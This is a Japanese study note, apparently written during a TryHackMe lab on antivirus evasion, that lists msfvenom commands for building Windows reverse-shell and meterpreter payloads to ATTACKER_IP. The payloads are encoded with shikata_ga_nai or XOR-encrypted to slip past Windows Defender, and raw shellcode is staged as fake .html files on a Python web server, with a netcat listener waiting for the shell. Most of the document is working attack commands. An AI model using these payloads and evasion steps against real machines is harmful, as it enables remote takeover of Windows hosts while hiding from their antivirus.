## AVに検知される奴

### エンコード
エンコーダーの一覧
```
$ msfvenom --list encoders | grep excellent
```

ペイロードの作成
```
$ msfvenom -a x86 --platform Windows LHOST=ATTACKER_IP LPORT=443 -p windows/shell_reverse_tcp -e x86/shikata_ga_nai -b '\x00' -i 3 -f csharp
```

### 暗号化
暗号一覧
```
$ msfvenom --list encrypt
```

ペイロードの作成
```
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=7788 -f exe --encrypt xor --encrypt-key "MyZekr3tKey***" -o xored-revshell.exe
```

これらは単純過ぎて、Windows Defenderに検知される。

## AVに検知されない奴

ドキュメントにしたがい試してみたが、自分のPCのWindows11ではWindows Defenderに検知される。

- THMのwindows defenderの状況
```
PS C:\Users\thm> Get-MpComputerStatus | Select-Object -Property AMEngineVersion, AMProductVersion, AntispywareSignatureVersion

AMEngineVersion AMProductVersion AntispywareSignatureVersion
--------------- ---------------- ---------------------------
1.1.19500.2     4.18.2205.7      1.373.1336.0


PS C:\Users\thm> Get-MpComputerStatus | Select-Object -Property AntivirusSignatureLastUpdated

AntivirusSignatureLastUpdated
-----------------------------
9/1/2022 3:20:12 AM
```

- 自分のPC
```
PS C:\Users\hoge> Get-MpComputerStatus | Select-Object -Property AMEngineVersion, AMProductVersion, AntispywareSignatureVersion

AMEngineVersion AMProductVersion AntispywareSignatureVersion
--------------- ---------------- ---------------------------
1.1.24050.5     4.18.24050.7     1.413.487.0


PS C:\Users\hoge> Get-MpComputerStatus | Select-Object -Property AntivirusSignatureLastUpdated

AntivirusSignatureLastUpdated
-----------------------------
2024/06/24 13:51:20
```

## なので自分で作った検知されない奴

### 共通の下準備

#### ステージャーの作成

それぞれ、`mfsvenom`でペイロードを作成して、webサーバーに設置。共通のステージャー(hoge.cs)を使用する。
1. hoge.csを作成
2. Windows上でコンパイル
```
>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe hoge.cs
```
3. 出来上がった`hoge.exe`をやられ役のWindowsに配備

#### kaliでwebサーバーを起動
```
$ python -m http.server
```

### パターン1: 電卓起動(ステージャー型)

1. ペイロードの作成
```
$ msfvenom -a x64 --platform windows -p windows/x64/exec cmd=calc.exe -f raw -o a.html -b '\x00\x0a\x0d'\n
```

2. やられ役のWindows上で、hoge.exeを実行


### パターン2: リバースシェル(ステージャー型)

1. ペイロードの作成
```
$ msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=<Kali IP> LPORT=7474 -f raw -o b.html -b '\x00\x0a\x0d\'
```

2. やられ役のWindows上で、hoge.exeを実行(ペイロードURLをb.htmlに変更して)

3. Kaliで待ち受ける
```
$ nc -lvp 7474
```

![image](https://github.com/yokohama/thm/assets/1023421/33cbaeee-37bc-4e0b-83cc-bb86328e6eb9)

